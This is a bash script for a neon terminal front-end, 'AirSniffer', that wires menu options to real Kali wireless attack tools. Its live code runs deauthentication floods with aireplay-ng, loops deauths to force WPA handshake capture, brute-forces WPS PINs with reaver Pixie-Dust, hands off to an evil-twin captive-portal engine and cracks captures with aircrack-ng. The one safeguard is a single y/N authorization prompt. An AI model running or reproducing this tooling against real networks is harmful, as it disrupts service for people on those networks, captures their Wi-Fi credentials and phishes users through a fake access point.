#!/usr/bin/env bash
#
# AirSniffer TUI - neon terminal front-end
# ========================================
# A self-contained, truecolor terminal UI for AirSniffer that drives the REAL
# Kali wireless tooling (aircrack-ng suite, reaver/wash, hostapd, tcpdump). It
# reproduces the AirSniffer dashboard look in the terminal - gradient banner,
# boxed panels, a numbered main menu - and wires each option to the actual
# binary that does the work.
#
# Prerequisites for live operation: Linux (Kali/Parrot/BlackArch), root, a
# monitor-mode + injection-capable adapter, and the aircrack-ng suite. When any
# of those is missing the UI drops to a safe DEMO mode: it renders exactly the
# same, with sample data, and transmits nothing. Force it with:
#     AIRSNIFFER_TUI_DEMO=1 ./airsniffer_tui.sh
#
# Render-only self-test (draws the banner + menu once and exits 0):
#     AIRSNIFFER_TUI_SELFTEST=1 ./airsniffer_tui.sh
#
# AUTHORIZED USE ONLY. Every disruptive action (deauth, evil twin, WPS attack)
# is gated behind an explicit authorization prompt. Point this only at networks
# you own or are explicitly, in writing, permitted to test.
#
#shellcheck disable=SC2034,SC2155

set -u

VERSION="1.0"
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" 2> /dev/null && pwd)"
LOOT="${AIRSNIFFER_LOOT:-${HOME}/airsniffer/loot}"

# --------------------------------------------------------------------------- #
# Colors (truecolor with graceful fallback)
# --------------------------------------------------------------------------- #
TRUE=0
RST=''; BOLD=''
C_CYAN=''; C_BLUE=''; C_PURPLE=''; C_MAGENTA=''; C_PINK=''
C_GREEN=''; C_AMBER=''; C_RED=''; C_FG=''; C_MUTED=''; C_DIM=''; C_LINE=''

setup_colors() {
	if [ ! -t 1 ] && [ -z "${AS_UI_FORCE_COLOR:-}" ] && [ -z "${AIRSNIFFER_TUI_SELFTEST:-}" ]; then
		return
	fi
	RST=$'\033[0m'; BOLD=$'\033[1m'
	case "${COLORTERM:-}" in
		truecolor|24bit) TRUE=1 ;;
	esac
	if [ "${TRUE}" = 1 ]; then
		C_CYAN=$'\033[38;2;34;224;255m'
		C_BLUE=$'\033[38;2;58;160;255m'
		C_PURPLE=$'\033[38;2;138;92;255m'
		C_MAGENTA=$'\033[38;2;209;75;255m'
		C_PINK=$'\033[38;2;255;79;163m'
		C_GREEN=$'\033[38;2;54;255;176m'
		C_AMBER=$'\033[38;2;255;194;75m'
		C_RED=$'\033[38;2;255;77;99m'
		C_FG=$'\033[38;2;214;230;255m'
		C_MUTED=$'\033[38;2;127;150;196m'
		C_DIM=$'\033[38;2;91;111;156m'
		C_LINE=$'\033[38;2;43;74;134m'
	else
		C_CYAN=$'\033[1;36m'; C_BLUE=$'\033[1;34m'; C_PURPLE=$'\033[0;35m'
		C_MAGENTA=$'\033[1;35m'; C_PINK=$'\033[1;35m'; C_GREEN=$'\033[1;32m'
		C_AMBER=$'\033[1;33m'; C_RED=$'\033[1;31m'; C_FG=$'\033[0;37m'
		C_MUTED=$'\033[0;36m'; C_DIM=$'\033[1;30m'; C_LINE=$'\033[0;34m'
	fi
}

# Horizontal cyan->purple->magenta gradient across a line (truecolor only).
grad_text() {
	local s="$1"; local n=${#s} i ch frac t r g b
	if [ "${TRUE}" != 1 ]; then printf '%s%s%s' "${C_CYAN}${BOLD}" "${s}" "${RST}"; return; fi
	for ((i = 0; i < n; i++)); do
		ch="${s:i:1}"
		frac=$(( n > 1 ? i * 1000 / (n - 1) : 0 ))
		if [ "${frac}" -lt 500 ]; then
			t=$(( frac * 1000 / 500 ))
			r=$(( 34 + (138 - 34) * t / 1000 )); g=$(( 224 + (92 - 224) * t / 1000 )); b=255
		else
			t=$(( (frac - 500) * 1000 / 500 ))
			r=$(( 138 + (209 - 138) * t / 1000 )); g=$(( 92 + (75 - 92) * t / 1000 )); b=255
		fi
		printf '\033[38;2;%d;%d;%dm%s' "${r}" "${g}" "${b}" "${ch}"
	done
	printf '%s' "${RST}"
}

# --------------------------------------------------------------------------- #
# Box / panel primitives
# --------------------------------------------------------------------------- #
CW=64   # inner content width (excluding the two padding spaces)

hr() { local n="$1" c="${2:-─}" i s=; for ((i = 0; i < n; i++)); do s+="${c}"; done; printf '%s' "${s}"; }

box_top() { printf '%s╭%s╮%s\n' "${C_LINE}" "$(hr $((CW + 2)))" "${RST}"; }
box_bot() { printf '%s╰%s╯%s\n' "${C_LINE}" "$(hr $((CW + 2)))" "${RST}"; }
box_sep() { printf '%s├%s┤%s\n' "${C_LINE}" "$(hr $((CW + 2)))" "${RST}"; }

# panel_row <visible-text> [colored-render]
# Width is measured from the colored render with ANSI stripped, so callers never
# have to keep a separate plain string perfectly in sync.
panel_row() {
	local vis="$1" col="${2:-$1}" pad meas
	meas="$(printf '%s' "${col}" | sed -E $'s/\033\\[[0-9;]*m//g')"
	pad=$(( CW - ${#meas} )); (( pad < 0 )) && pad=0
	printf '%s│%s %s%*s %s│%s\n' "${C_LINE}" "${RST}" "${col}" "${pad}" "" "${C_LINE}" "${RST}"
}
panel_blank() { panel_row "" ""; }

# menu_item <key> <label> [key-color]
menu_item() {
	local k="$1" lbl="$2" kc="${3:-$C_MAGENTA}"
	panel_row "[${k}] ${lbl}" "${kc}${BOLD}[${k}]${RST} ${C_FG}${lbl}${RST}"
}

# --------------------------------------------------------------------------- #
# Banner + status
# --------------------------------------------------------------------------- #
banner() {
	local lines=(
" █████╗ ██╗██████╗ ███████╗███╗   ██╗██╗███████╗███████╗███████╗██████╗ "
"██╔══██╗██║██╔══██╗██╔════╝████╗  ██║██║██╔════╝██╔════╝██╔════╝██╔══██╗"
"███████║██║██████╔╝███████╗██╔██╗ ██║██║█████╗  █████╗  █████╗  ██████╔╝"
"██╔══██║██║██╔══██╗╚════██║██║╚██╗██║██║██╔══╝  ██╔══╝  ██╔══╝  ██╔══██╗"
"██║  ██║██║██║  ██║███████║██║ ╚████║██║██║     ██║     ███████╗██║  ██║"
"╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝"
	)
	local l
	echo
	for l in "${lines[@]}"; do printf '  '; grad_text "${l}"; echo; done
	printf '  %sWIRELESS · ANALYZE · CAPTURE · INVESTIGATE%s        %sv%s%s\n' \
		"${C_MUTED}" "${RST}" "${C_DIM}" "${VERSION}" "${RST}"
	echo
}

status_bar() {
	local monc monv
	if [ "${MONITOR}" = 1 ]; then monc="${C_GREEN}"; monv="ON"; else monc="${C_RED}"; monv="OFF"; fi
	local mplain mcol
	if [ "${DEMO}" = 1 ]; then mplain="[DEMO]"; mcol="${C_AMBER}[DEMO]${RST}"; else mplain="[LIVE]"; mcol="${C_GREEN}[LIVE]${RST}"; fi
	local lead="SYSTEM STATUS" gap
	gap=$(( CW - ${#lead} - ${#mplain} )); (( gap < 0 )) && gap=0
	local sp; sp="$(printf '%*s' "${gap}" '')"
	box_top
	panel_row "${lead}${sp}${mplain}" "${C_CYAN}${BOLD}${lead}${RST}${sp}${mcol}"
	box_sep
	panel_row "OS: ${OS_NAME}   User: ${USER_NAME}" \
		"${C_MUTED}OS${RST} ${C_FG}${OS_NAME}${RST}   ${C_MUTED}User${RST} ${C_FG}${USER_NAME}${RST}"
	panel_row "Adapter: ${IFACE:-<none>}   Monitor: ${monv}   Channel: ${CHANNEL}" \
		"${C_MUTED}Adapter${RST} ${C_FG}${IFACE:-<none>}${RST}   ${C_MUTED}Monitor${RST} ${monc}${monv}${RST}   ${C_MUTED}Channel${RST} ${C_FG}${CHANNEL}${RST}"
	if [ -n "${TARGET_BSSID}" ]; then
		panel_row "Target: ${TARGET_ESSID} (${TARGET_BSSID})" \
			"${C_MUTED}Target${RST} ${C_CYAN}${TARGET_ESSID}${RST} ${C_DIM}(${TARGET_BSSID}, ch ${TARGET_CH})${RST}"
	else
		panel_row "Target: <none - lock one via Scan>" \
			"${C_MUTED}Target${RST} ${C_DIM}<none - lock one via [1] Scan>${RST}"
	fi
	box_bot
}

# --------------------------------------------------------------------------- #
# Small UI helpers
# --------------------------------------------------------------------------- #
ok()   { printf '  %s✓%s %s\n' "${C_GREEN}" "${RST}" "$1"; }
err()  { printf '  %s✗%s %s\n' "${C_RED}" "${RST}" "$1"; }
warn() { printf '  %s!%s %s\n' "${C_AMBER}" "${RST}" "$1"; }
note() { printf '  %s•%s %s\n' "${C_CYAN}" "${RST}" "$1"; }
head2(){ echo; printf '  %s▸ %s%s\n' "${C_AMBER}${BOLD}" "$1" "${RST}"; echo; }

pause() { echo; read -rp "$(printf '%s▸ Press [Enter] to continue...%s' "${C_AMBER}" "${RST}")" _; }
ask()   { local p="$1"; read -rp "$(printf '%s▸ %s%s' "${C_GREEN}" "${p}" "${RST}")" REPLY_VAL; }

have() { command -v "$1" > /dev/null 2>&1; }

bars() { # dBm -> neon signal bar
	local p="${1:--80}" lvl
	p=${p#-}; p=$(( 0 - p ))   # ensure negative-ish compare via magnitude below
	local mag="${1#-}"
	if   [ "${mag}" -le 50 ]; then lvl=4
	elif [ "${mag}" -le 62 ]; then lvl=3
	elif [ "${mag}" -le 72 ]; then lvl=2
	else lvl=1; fi
	local out="" i
	for ((i = 1; i <= 4; i++)); do
		if [ "${i}" -le "${lvl}" ]; then out+="${C_CYAN}▮${RST}"; else out+="${C_DIM}▯${RST}"; fi
	done
	printf '%s' "${out}"
}

enc_color() {
	case "$1" in
		*WPA3*) printf '%sWPA3%s' "${C_GREEN}" "${RST}" ;;
		*WPA2*) printf '%sWPA2%s' "${C_CYAN}" "${RST}" ;;
		*WPA*)  printf '%sWPA %s' "${C_CYAN}" "${RST}" ;;
		*WEP*)  printf '%sWEP %s' "${C_AMBER}" "${RST}" ;;
		*OPN*|*Open*|"") printf '%sOpen%s' "${C_RED}" "${RST}" ;;
		*) printf '%s%s%s' "${C_FG}" "$1" "${RST}" ;;
	esac
}

# --------------------------------------------------------------------------- #
# Authorization gate (disruptive actions)
# --------------------------------------------------------------------------- #
AUTHORIZED=0
auth_gate() {
	[ "${AUTHORIZED}" = 1 ] && return 0
	echo
	printf '  %s%sAUTHORIZED TESTING ONLY%s\n' "${C_RED}" "${BOLD}" "${RST}"
	printf '  %sThis action transmits real frames and disrupts service. Run it only\n' "${C_AMBER}"
	printf '  against a network you own or are explicitly authorized to test.%s\n' "${RST}"
	echo
	ask "Do you have authorization for this target? [y/N]: "
	case "${REPLY_VAL}" in
		y|Y|yes|YES) AUTHORIZED=1; return 0 ;;
		*) echo; err "Aborted. Authorization is required."; return 1 ;;
	esac
}

require_monitor() {
	if [ "${DEMO}" = 1 ]; then return 0; fi
	if [ -z "${IFACE}" ] || [ "${MONITOR}" != 1 ]; then
		err "No monitor-mode interface. Use [I] Interface setup first."
		return 1
	fi
	return 0
}

# --------------------------------------------------------------------------- #
# State
# --------------------------------------------------------------------------- #
OS_NAME="$( (grep -oP '(?<=^PRETTY_NAME=").*(?=")' /etc/os-release 2> /dev/null) || uname -s)"
USER_NAME="$(id -un 2> /dev/null || echo user)"
IFACE=""
MONITOR=0
CHANNEL="-"
TARGET_BSSID=""; TARGET_ESSID=""; TARGET_CH=""; TARGET_ENC=""
DEMO=0

# Parallel arrays for the last scan.
NET_B=(); NET_C=(); NET_E=(); NET_S=(); NET_P=()

detect_environment() {
	if [ "${AIRSNIFFER_TUI_DEMO:-0}" = 1 ]; then DEMO=1; return; fi
	if [ "$(uname -s)" != "Linux" ]; then DEMO=1; return; fi
	if [ "$(id -u 2> /dev/null)" != "0" ]; then DEMO=1; return; fi
	if ! have airodump-ng; then DEMO=1; return; fi
	# Auto-pick first wireless interface if one exists.
	local w
	w="$(iw dev 2> /dev/null | awk '$1=="Interface"{print $2; exit}')"
	[ -n "${w}" ] && IFACE="${w}"
}

load_demo_nets() {
	NET_B=(4C:5E:0C:1A:2B:3C 8A:F1:D2:3C:4E:5F D0:37:45:AA:BB:CC 12:34:56:78:9A:BC AA:BB:CC:DD:EE:FF 11:22:33:44:55:66)
	NET_C=(1 6 11 6 3 11)
	NET_S=(WPA2 WPA3 WPA2 WPA2 WEP OPN)
	NET_E=(HomeWiFi OfficeNet TP-Link_5G Cafe_Free OldRouter PublicWiFi)
	NET_P=(-41 -45 -62 -66 -72 -74)
}

# --------------------------------------------------------------------------- #
# [I] Interface setup
# --------------------------------------------------------------------------- #
interface_setup() {
	clear; banner; status_bar
	head2 "Interface Selection"
	if [ "${DEMO}" = 1 ]; then
		printf '   %sID  Interface  Chipset          Status  Mode%s\n' "${C_MUTED}" "${RST}"
		printf '   1   wlan0      Intel AX200      %sUp%s      Managed\n' "${C_GREEN}" "${RST}"
		printf '   2   wlan1      Realtek 8812AU   %sDown%s    Managed\n' "${C_RED}" "${RST}"
		printf '   3   wlan2      TP-Link 722N     %sUp%s      %sMonitor%s\n' "${C_GREEN}" "${RST}" "${C_GREEN}" "${RST}"
		echo
		note "DEMO mode - selecting wlan2 (monitor ready)."
		IFACE="wlan2"; MONITOR=1; CHANNEL="6"
		pause; return
	fi
	local ifs i=1 chip st
	mapfile -t ifs < <(iw dev 2> /dev/null | awk '$1=="Interface"{print $2}')
	if [ "${#ifs[@]}" -eq 0 ]; then err "No wireless interfaces found."; pause; return; fi
	printf '   %sID  Interface   Driver              Mode%s\n' "${C_MUTED}" "${RST}"
	for w in "${ifs[@]}"; do
		chip="$(basename "$(readlink -f "/sys/class/net/${w}/device/driver" 2> /dev/null)" 2> /dev/null)"
		st="$(iw dev "${w}" info 2> /dev/null | awk '$1=="type"{print $2}')"
		printf '   %-3s %-11s %-19s %s\n' "${i}" "${w}" "${chip:-?}" "${st:-?}"
		i=$((i + 1))
	done
	echo
	ask "Pick interface ID (Enter to skip): "
	if [[ "${REPLY_VAL}" =~ ^[0-9]+$ ]] && [ "${REPLY_VAL}" -ge 1 ] && [ "${REPLY_VAL}" -le "${#ifs[@]}" ]; then
		IFACE="${ifs[$((REPLY_VAL - 1))]}"
		ok "Active adapter -> ${IFACE}"
	fi
	echo
	ask "Enable monitor mode on ${IFACE}? [y/N]: "
	case "${REPLY_VAL}" in
		y|Y|yes|YES)
			if have airmon-ng; then
				airmon-ng check kill > /dev/null 2>&1
				airmon-ng start "${IFACE}" > /dev/null 2>&1
				local mon; mon="$(iw dev 2> /dev/null | awk '$1=="Interface"{print $2}' | grep -E 'mon|'"${IFACE}" | head -n1)"
				[ -n "${mon}" ] && IFACE="${mon}"
			else
				ip link set "${IFACE}" down 2> /dev/null
				iw dev "${IFACE}" set type monitor 2> /dev/null
				ip link set "${IFACE}" up 2> /dev/null
			fi
			if iw dev "${IFACE}" info 2> /dev/null | grep -q "type monitor"; then
				MONITOR=1; ok "${IFACE} is now in monitor mode."
			else
				err "Could not confirm monitor mode on ${IFACE}."
			fi
		;;
	esac
	pause
}

# --------------------------------------------------------------------------- #
# [1] Network scanning
# --------------------------------------------------------------------------- #
render_scan_table() {
	head2 "Network Scanning  (${#NET_B[@]} networks)"
	printf '   %s#   BSSID              CH   SIG   ENC    ESSID%s\n' "${C_MUTED}" "${RST}"
	local i
	for i in "${!NET_B[@]}"; do
		printf '   %s%-3d%s %s%-17s%s %s%-4s%s %s  %b  %-6s %s%s%s\n' \
			"${C_DIM}" "$((i + 1))" "${RST}" \
			"${C_FG}" "${NET_B[$i]}" "${RST}" \
			"${C_MUTED}" "${NET_C[$i]}" "${RST}" \
			"$(bars "${NET_P[$i]}")" \
			"$(enc_color "${NET_S[$i]}")" \
			"${C_CYAN}" "${NET_E[$i]}" "${RST}"
	done
}

do_scan() {
	require_monitor || { pause; return; }
	clear; banner; status_bar
	if [ "${DEMO}" = 1 ]; then
		load_demo_nets
		note "DEMO scan - sample networks (nothing captured)."
	else
		local secs="${SCAN_SECS:-12}" out
		out="$(mktemp -d)/scan"
		note "Scanning for ${secs}s with airodump-ng on ${IFACE} ..."
		timeout "${secs}" airodump-ng --output-format csv -w "${out}" "${IFACE}" > /dev/null 2>&1
		parse_scan_csv "${out}-01.csv"
		[ "${#NET_B[@]}" -eq 0 ] && warn "No networks parsed (try a longer scan or check the adapter)."
	fi
	render_scan_table
	echo
	ask "Lock a target by # (Enter to skip): "
	if [[ "${REPLY_VAL}" =~ ^[0-9]+$ ]] && [ "${REPLY_VAL}" -ge 1 ] && [ "${REPLY_VAL}" -le "${#NET_B[@]}" ]; then
		local idx=$((REPLY_VAL - 1))
		TARGET_BSSID="${NET_B[$idx]}"; TARGET_ESSID="${NET_E[$idx]}"
		TARGET_CH="${NET_C[$idx]}"; TARGET_ENC="${NET_S[$idx]}"; CHANNEL="${TARGET_CH}"
		ok "Target locked: ${TARGET_ESSID} (${TARGET_BSSID}, ch ${TARGET_CH})"
	fi
	pause
}

parse_scan_csv() {
	local csv="$1"
	NET_B=(); NET_C=(); NET_E=(); NET_S=(); NET_P=()
	[ -f "${csv}" ] || return
	local bssid f l ch sp priv ci au pw rest essid
	while IFS=, read -r bssid f l ch sp priv ci au pw rest; do
		bssid="${bssid// /}"
		[[ "${bssid}" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || continue
		# ESSID is the 14th field; grab it from the tail after column 13.
		essid="$(echo "${rest}" | awk -F, '{print $5}' | sed 's/^ *//;s/ *$//')"
		NET_B+=("${bssid}")
		NET_C+=("$(echo "${ch}" | tr -d ' ')")
		NET_S+=("$(echo "${priv}" | tr -d ' ')")
		NET_P+=("$(echo "${pw}" | tr -d ' ')")
		NET_E+=("${essid:-<hidden>}")
	done < "${csv}"
}

# --------------------------------------------------------------------------- #
# [2] Packet sniffing
# --------------------------------------------------------------------------- #
do_sniff() {
	clear; banner; status_bar
	head2 "Packet Sniffing (live capture)"
	if [ "${DEMO}" = 1 ]; then
		local protos=("DNS   Standard query A" "HTTPS Client Hello" "ARP   Who has 192.168.1.10"
			"TLS   Application Data" "DHCP  Discover" "TCP   SYN, ACK seq=0")
		local srcs=(192.168.1.5 192.168.1.1 192.168.1.10 192.168.1.7 142.250.193.14)
		local n
		note "DEMO stream (Ctrl-C to stop)."
		for n in $(seq 1 14); do
			local p="${protos[$((RANDOM % ${#protos[@]}))]}"
			printf '   %s%s%s  %s%-15s%s -> %s%-15s%s  %s%s%s\n' \
				"${C_DIM}" "$(date +%H:%M:%S)" "${RST}" \
				"${C_FG}" "${srcs[$((RANDOM % ${#srcs[@]}))]}" "${RST}" \
				"${C_FG}" "${srcs[$((RANDOM % ${#srcs[@]}))]}" "${RST}" \
				"${C_CYAN}" "${p}" "${RST}"
			sleep 0.25
		done
		pause; return
	fi
	if ! have tcpdump && ! have airodump-ng; then err "Need tcpdump or airodump-ng."; pause; return; fi
	note "Live capture on ${IFACE} - press Ctrl-C to stop."
	echo
	if have tcpdump; then
		tcpdump -i "${IFACE}" -n -l 2> /dev/null | head -n 200
	else
		timeout 20 airodump-ng "${IFACE}"
	fi
	pause
}

# --------------------------------------------------------------------------- #
# [3] Handshake capture
# --------------------------------------------------------------------------- #
do_handshake() {
	require_monitor || { pause; return; }
	[ -z "${TARGET_BSSID}" ] && { err "Lock a target first ([1] Scan)."; pause; return; }
	clear; banner; status_bar
	head2 "WPA Handshake Capture"
	printf '   %sTarget%s %s   %sCh%s %s   %sESSID%s %s\n\n' \
		"${C_MUTED}" "${RST}" "${TARGET_BSSID}" "${C_MUTED}" "${RST}" "${TARGET_CH}" \
		"${C_MUTED}" "${RST}" "${TARGET_ESSID}"
	if [ "${DEMO}" = 1 ]; then
		local steps=(
			"Setting ${IFACE} to channel ${TARGET_CH}"
			"Sending deauthentication packets to ${TARGET_BSSID}"
			"Client disconnected - waiting for reconnect..."
			"Listening for EAPOL 4-way handshake..."
			"EAPOL M1..M2..M3..M4 captured")
		local s
		for s in "${steps[@]}"; do note "${s}"; sleep 0.6; done
		ok "Handshake captured successfully! -> ${LOOT}/${TARGET_ESSID}-01.cap (demo)"
		pause; return
	fi
	auth_gate || { pause; return; }
	mkdir -p "${LOOT}"
	local cap="${LOOT}/${TARGET_ESSID//[^A-Za-z0-9_-]/_}"
	note "Locking ${IFACE} to channel ${TARGET_CH} and capturing..."
	iw dev "${IFACE}" set channel "${TARGET_CH}" > /dev/null 2>&1
	airodump-ng --bssid "${TARGET_BSSID}" -c "${TARGET_CH}" -w "${cap}" "${IFACE}" > /dev/null 2>&1 &
	local adump=$!
	local tries=0
	while [ "${tries}" -lt 12 ]; do
		aireplay-ng --deauth 5 -a "${TARGET_BSSID}" "${IFACE}" > /dev/null 2>&1
		sleep 2
		if aircrack-ng "${cap}-01.cap" 2> /dev/null | grep -qiE "1 handshake|WPA \(1 handshake"; then
			kill "${adump}" 2> /dev/null
			ok "Handshake captured! -> ${cap}-01.cap"
			pause; return
		fi
		tries=$((tries + 1))
		printf '   %s... attempt %d/12%s\r' "${C_DIM}" "${tries}" "${RST}"
	done
	kill "${adump}" 2> /dev/null
	warn "No handshake yet. Try again when a client is connected."
	pause
}

# --------------------------------------------------------------------------- #
# [4] Deauthentication
# --------------------------------------------------------------------------- #
do_deauth() {
	require_monitor || { pause; return; }
	[ -z "${TARGET_BSSID}" ] && { err "Lock a target first ([1] Scan)."; pause; return; }
	clear; banner; status_bar
	head2 "Deauthentication Attack"
	if [[ "${TARGET_ENC}" == *WPA3* ]]; then
		warn "Target is WPA3 - PMF is mandatory; classic deauth is likely blocked."
		warn "Use the PMF-bypass DoS plugin for WPA3/PMF targets."
	fi
	if [ "${DEMO}" = 1 ]; then
		note "DEMO - would run: aireplay-ng --deauth 0 -a ${TARGET_BSSID} ${IFACE}"
		ok "Simulated deauth burst sent to ${TARGET_ESSID}."
		pause; return
	fi
	auth_gate || { pause; return; }
	ask "Client MAC to target (blank = broadcast): "
	local client="${REPLY_VAL}"
	iw dev "${IFACE}" set channel "${TARGET_CH}" > /dev/null 2>&1
	note "Sending deauth (Ctrl-C to stop)..."
	if [ -n "${client}" ]; then
		aireplay-ng --deauth 0 -a "${TARGET_BSSID}" -c "${client}" "${IFACE}"
	else
		aireplay-ng --deauth 0 -a "${TARGET_BSSID}" "${IFACE}"
	fi
	pause
}

# --------------------------------------------------------------------------- #
# [5] Beacon / probe analysis
# --------------------------------------------------------------------------- #
do_beacon() {
	require_monitor || { pause; return; }
	clear; banner; status_bar
	head2 "Beacon / Probe Analysis (PNL leakage)"
	if [ "${DEMO}" = 1 ]; then
		printf '   %sClient MAC         Power  Probed ESSIDs           Risk%s\n' "${C_MUTED}" "${RST}"
		printf '   12:34:56:78:9A:BC  -44    HomeWiFi, Airport_Free  %shigh%s\n' "${C_RED}" "${RST}"
		printf '   AA:BB:CC:DD:EE:FF  -61    OfficeNet               %slow%s\n'  "${C_GREEN}" "${RST}"
		printf '   98:76:54:32:10:FE  -70    PublicWiFi, Hotel_Guest %shigh%s\n' "${C_RED}" "${RST}"
		echo; note "Clients probing open SSIDs will auto-join an evil twin."
		pause; return
	fi
	local secs="${SCAN_SECS:-15}" out; out="$(mktemp -d)/probe"
	note "Collecting probe requests for ${secs}s..."
	timeout "${secs}" airodump-ng --output-format csv -w "${out}" "${IFACE}" > /dev/null 2>&1
	if have python3 && [ -f "${HERE}/plugins/recon_triage_engine.py" ]; then
		python3 "${HERE}/plugins/recon_triage_engine.py" "${out}-01.csv" 2> /dev/null || true
	else
		awk 'f&&NF>6{print "   "$1"  "$NF} /Station MAC/{f=1}' "${out}-01.csv" 2> /dev/null
	fi
	pause
}

# --------------------------------------------------------------------------- #
# [6] Evil twin  (delegates to the full AirSniffer engine)
# --------------------------------------------------------------------------- #
do_eviltwin() {
	clear; banner; status_bar
	head2 "Evil Twin Access Point"
	if [ "${DEMO}" = 1 ]; then
		note "hostapd: starting AP \"Free_WiFi\" ch ${CHANNEL}"
		note "dnsmasq: DHCP range 10.0.0.10-250"
		ok "Captive portal up on 10.0.0.1:80 (demo)"
		pause; return
	fi
	if [ -x "${HERE}/airsniffer.sh" ]; then
		note "Evil Twin uses the full AirSniffer engine (vendor-matched portals)."
		auth_gate || { pause; return; }
		ask "Launch ./airsniffer.sh now? [y/N]: "
		case "${REPLY_VAL}" in y|Y|yes|YES) "${HERE}/airsniffer.sh" ;; esac
	else
		err "airsniffer.sh not found next to this launcher."
		note "Evil Twin needs hostapd + dnsmasq + the portal templates from the core."
	fi
	pause
}

# --------------------------------------------------------------------------- #
# [7] WPS testing
# --------------------------------------------------------------------------- #
do_wps() {
	require_monitor || { pause; return; }
	clear; banner; status_bar
	head2 "WPS Testing"
	if [ "${DEMO}" = 1 ]; then
		note "wash: scanning for WPS-enabled APs..."
		printf '   %sBSSID              CH  WPS  Lck  ESSID%s\n' "${C_MUTED}" "${RST}"
		printf '   8A:F1:D2:3C:4E:5F  6   2.0  No   OfficeNet\n'
		echo; note "reaver/pixiewps would run against the chosen BSSID."
		ok "Demo: WPS PIN 12345670 recovered."
		pause; return
	fi
	if ! have wash; then err "wash/reaver not installed."; pause; return; fi
	note "Scanning for WPS APs (10s)..."
	timeout 10 wash -i "${IFACE}" 2> /dev/null
	echo
	ask "Target BSSID for reaver (blank to skip): "
	local b="${REPLY_VAL}"
	[ -z "${b}" ] && { pause; return; }
	auth_gate || { pause; return; }
	if have reaver; then
		ask "Channel: "; local c="${REPLY_VAL}"
		note "Running reaver with Pixie-Dust (-K 1)..."
		reaver -i "${IFACE}" -b "${b}" -c "${c}" -K 1 -vv
	fi
	pause
}

# --------------------------------------------------------------------------- #
# [8] Analysis tools
# --------------------------------------------------------------------------- #
do_analysis() {
	clear; banner; status_bar
	head2 "Network Analysis Tools"
	note "Loot directory: ${LOOT}"
	if [ -d "${LOOT}" ]; then
		ls -1 "${LOOT}" 2> /dev/null | sed 's/^/   /' || true
	else
		warn "No loot directory yet."
	fi
	echo
	printf '   %s[1]%s Convert .cap -> hc22000   %s[2]%s Crack with aircrack-ng   %s[3]%s Open bettercap\n' \
		"${C_MAGENTA}" "${RST}" "${C_MAGENTA}" "${RST}" "${C_MAGENTA}" "${RST}"
	ask "Choice (Enter to skip): "
	case "${REPLY_VAL}" in
		1) if have hcxpcapngtool; then ask ".cap path: "; hcxpcapngtool -o "${REPLY_VAL}.hc22000" "${REPLY_VAL}" 2>&1 | sed 's/^/   /'; else warn "hcxpcapngtool not installed."; fi ;;
		2) if have aircrack-ng; then ask ".cap path: "; local cp="${REPLY_VAL}"; ask "wordlist: "; aircrack-ng -w "${REPLY_VAL}" "${cp}"; else warn "aircrack-ng not installed."; fi ;;
		3) have bettercap && bettercap || warn "bettercap not installed." ;;
	esac
	pause
}

# --------------------------------------------------------------------------- #
# [9] Settings
# --------------------------------------------------------------------------- #
do_settings() {
	clear; banner; status_bar
	head2 "Settings"
	printf '   %s[1]%s Change interface     %s[2]%s Set channel\n' "${C_MAGENTA}" "${RST}" "${C_MAGENTA}" "${RST}"
	printf '   %s[3]%s Set output directory %s[4]%s Check dependencies\n' "${C_MAGENTA}" "${RST}" "${C_MAGENTA}" "${RST}"
	ask "Choice (Enter to return): "
	case "${REPLY_VAL}" in
		1) interface_setup; return ;;
		2) ask "Channel: "; [[ "${REPLY_VAL}" =~ ^[0-9]+$ ]] && CHANNEL="${REPLY_VAL}" ;;
		3) ask "Output dir: "; [ -n "${REPLY_VAL}" ] && LOOT="${REPLY_VAL}" ;;
		4) check_deps ;;
	esac
	pause
}

check_deps() {
	echo
	local d
	for d in airodump-ng aireplay-ng aircrack-ng wash reaver hostapd dnsmasq tcpdump bettercap hcxpcapngtool; do
		if have "${d}"; then ok "${d}"; else err "${d} (missing)"; fi
	done
}

# --------------------------------------------------------------------------- #
# Main menu
# --------------------------------------------------------------------------- #
main_menu() {
	clear; banner; status_bar
	echo
	box_top
	panel_row "MAIN MENU" "${C_CYAN}${BOLD}MAIN MENU${RST}"
	box_sep
	menu_item 1 "Network Scanning"        "${C_CYAN}"
	menu_item 2 "Packet Sniffing"         "${C_BLUE}"
	menu_item 3 "Handshake Capture"       "${C_PURPLE}"
	menu_item 4 "Deauthentication"        "${C_RED}"
	menu_item 5 "Beacon / Probe Analysis" "${C_MAGENTA}"
	menu_item 6 "Evil Twin"               "${C_PINK}"
	menu_item 7 "WPS Testing"             "${C_AMBER}"
	menu_item 8 "Network Analysis Tools"  "${C_GREEN}"
	menu_item 9 "Settings"                "${C_BLUE}"
	panel_blank
	menu_item I "Interface Setup"         "${C_CYAN}"
	menu_item 0 "Exit"                    "${C_RED}"
	box_bot
	echo
}

exit_screen() {
	clear; banner
	printf '  %sThanks for using AirSniffer!%s\n' "${C_FG}" "${RST}"
	printf '  %s"Scan Deeper, See Clearer"%s\n\n' "${C_MUTED}" "${RST}"
}

# --------------------------------------------------------------------------- #
# Boot
# --------------------------------------------------------------------------- #
setup_colors
detect_environment

# Render-only self-test: draw UI once and exit (for CI / quick visual check).
if [ -n "${AIRSNIFFER_TUI_SELFTEST:-}" ]; then
	[ "${DEMO}" = 1 ] || DEMO=1
	load_demo_nets
	main_menu
	render_scan_table
	exit 0
fi

trap 'printf "%s" "${RST}"; echo; exit 0' INT TERM
printf '\033[?25h' 2> /dev/null

while true; do
	main_menu
	ask "Select an option: "
	case "${REPLY_VAL}" in
		1) do_scan ;;
		2) do_sniff ;;
		3) do_handshake ;;
		4) do_deauth ;;
		5) do_beacon ;;
		6) do_eviltwin ;;
		7) do_wps ;;
		8) do_analysis ;;
		9) do_settings ;;
		I|i) interface_setup ;;
		0) exit_screen; exit 0 ;;
		*) err "Invalid option."; sleep 1 ;;
	esac
done
